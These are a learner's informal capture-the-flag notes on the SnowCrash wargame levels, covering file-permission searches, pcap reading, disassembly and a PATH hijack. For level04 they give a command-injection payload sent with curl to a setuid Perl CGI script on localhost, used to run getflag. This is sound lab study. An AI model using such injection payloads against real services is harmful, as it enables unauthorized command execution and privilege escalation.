find with certain permission:
- find / -user flag00 2>/dev/null : files that are owned by user flag00 || -perm -u=rw => permet de trier par execution.
- sudo -i => ouvrir une session root
- scp -P 4243 level00@127.0.0.1:/usr/sbin/john . => copy the john file in my actual directory

=======================
level02 => pcap reading file. need to read the data of each packet with wireshark.
	right click on the packet inside wireshark => follow => TCP stream it gives me all the data from the conversation.

========================
level03 : strings <filename> => show only the caracters inside a file
	- objdump -d -Mintel level03 => dissasemble a binary file
assembly functions 

- push <value>: add an operande (value) to the stack
- mov <target> <source> : add value2 to target
- and <target> <mask> : and binary, put the result inside target
- sub <target> <value> : substract target with the value and store it inside target
- ebp => base pointer in assembly, all the other pointer are above it
- ebp will be the base pointer and esp will be at the max allcoate memory of the current function or space.
mov     eax, [esp+18h]  ; Load group ID
mov     [esp+8], eax    ; Parameter 3
mov     eax, [esp+18h]  ; Load group ID again
mov     [esp+4], eax    ; Parameter 2
mov     eax, [esp+18h]  ; Load group ID once more
mov     [esp], eax      ; Parameter 1

mov [esp+1Ch], eax      ; Store value at offset 28 (0x1C)
mov eax, [esp+18h]      ; Load value from offset 24 (0x18)
mov [esp+8], eax        ; Store same value at offset 8
mov eax, [esp+18h]      ; Load same value again from offset 24
mov [esp+4], eax        ; Store same value at offset 4
mov eax, [esp+18h]      ; Load same value again from offset 24
mov [esp], eax          ; Store same value at offset 0


I just have to create  a script that launch getflag and  have the name echo and change the env PATH

======================
level04 : the goal was to elevated my privilege with a script perl:
		#!/usr/bin/perl
		# localhost:4747
		use CGI qw{param};
		print "Content-type: text/html\n\n";
		sub x {
		  $y = $_[0];
		  print `echo $y 2>&1`;
		}
		x(param("x"));
this is the script. so the script run on localhost:4747. I take a function call x who echo y which the first parameter pass to my perl script like argv[0] in c.
so as we saw we can launch the script and pass a parameter that is being print for example if i put:
./level04.pl x="salut"
it will print "salut"
so i can pass getflag tomy script because the permission are the following:
	-rwsr-sr-x 1 flag04 level04 152 Mar  5  2016 level04.pl => i have the flag04 permission.
to pass a command to echo i have to put $(<command>)
the first problem was the output of this command:
	./level04.pl x="$(getflag)"
=> i had an output like that:
	Content-type: text/html

	sh: 2: Syntax error: ")" unexpected
	Check flag.Here is your token :
	level04@SnowCrash:~$ 
I have my token but the result of the token is not print directly. why??
Because when i pass the parameter $(getflag) the shell interpret it before passing it to the echo command. That is not the behaviour that we want
To prevent that we need to pass it like that to tell the shell to not interpret it => x=\$(getflag) with the \ this escape the interpretation.
but after passing this command:
	./level04.pl x="\$(getflag)"
I have this result:
	Content-type: text/html
	Check flag.Here is your token : Nope there is no token here for you sorry. Try again :)
it looks like the script isn't executing as flag00. why??
Because when the shell executing a script with setuid different the operating system ignore the setuid bit for interpreted script. It does it for security reason.
the real response specific to perl script is this one:
	When the kernel executes a file with the setuid bit set, it is supposed to run the process with the permissions of the file owner (in this case, flag04). 
	However, for interpreted scripts (e.g., those run by /usr/bin/perl), the kernel doesn't directly execute the script. 
	Instead, it invokes the interpreter (/usr/bin/perl) and passes the script as an argument. 
	This indirect execution bypasses the setuid mechanism, and the script runs with the permissions of the calling user (level04 in this case), not flag04.
So I was in the wrong direction. But if you see in my script the perl is using cgi module and run on localhost.
There is a webserver that is running on localhost:4747. I research for a culr command to execut my script:
	curl "http://localhost:4747/?x=\$(getflag)"
I try this one and it works.
But why now I have the permission of flag04 and not level04 as before? Because now I run my script from the webserv and that's him that interpret the script and not my operating system.
So there is not the security of the operating system that appear before.
I have a server that is running on my machine:
	netstat -tuln => show that process running. -t => tcp connections -u => udp connection -l => listening sockets -n => numerical addresses and ports
the output is:
	Active Internet connections (only servers)
	Proto Recv-Q Send-Q Local Address           Foreign Address         State      
	tcp        0      0 0.0.0.0:4242            0.0.0.0:*               LISTEN     
	tcp        0      0 127.0.0.1:5151          0.0.0.0:*               LISTEN     
	tcp6       0      0 :::4646                 :::*                    LISTEN     
	tcp6       0      0 :::4747                 :::*                    LISTEN     
	tcp6       0      0 :::80                   :::*                    LISTEN     
	tcp6       0      0 :::4242                 :::*                    LISTEN     
	udp        0      0 0.0.0.0:68              0.0.0.0:*                          
So i have a server that is running

=================================
level05

